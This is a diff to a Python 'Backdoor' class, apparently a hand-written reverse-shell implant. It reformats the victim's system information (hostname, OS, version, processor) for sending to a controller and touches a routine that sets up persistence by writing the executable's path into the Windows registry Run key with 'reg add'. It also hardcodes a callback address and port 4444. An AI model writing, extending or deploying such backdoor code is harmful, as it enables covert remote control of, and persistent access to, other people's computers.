@@ -24,10 +24,11 @@ class Backdoor:
             return "[+] ERROR - Error during command execution"
         
     def system_info(self, data):
-        data += "\n\n"
-        data += str(platform.uname())
-        data += "\n"
-        data += str(platform.processor())
+        data += "|"
+        data += platform.node()+"|"
+        data += platform.system()+"|"
+        data += platform.version()+"|"
+        data += platform.processor()+"|"
         self.reliable_send(data)
 
     def persistence(self):
@@ -49,15 +50,15 @@ class Backdoor:
             #  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Scheduler /t REG_SZ /d C:/Users/user1/AppData/Roaming/scheduler.exe /f
             #                                                                                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             #                                                                                        os.environ['appdata']
-            res = "\n[+] Continuing with Persistence Operations"
+            res = "|[+] Continuing with Persistence Operations"
             try:
                 subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Scheduler /t REG_SZ /d '+location+' /f',shell=True)
-                res = "\n[+] Successfully added executable to the Registry"
+                res = "|[+] Successfully added executable to the Registry"
             except:
-                res = "\n[-] ERROR - Cannot add executable for persistence"
+                res = "|[-] ERROR - Cannot add executable for persistence"
             data = data + res
         else:
-            data += "\n[+] Persistence already established\n[+] Continuing previous session"
+            data += "|[+] Persistence already established\n[+] Continuing previous session"
             
         self.system_info(data)
         return
@@ -116,7 +117,7 @@ class Backdoor:
             self.reliable_send(res)
 
 try:
-    backdoor = Backdoor("10.124.27.174",4444)
+    backdoor = Backdoor("192.168.1.37",4444)
     backdoor.run()
 except:
     sys.exit(0)
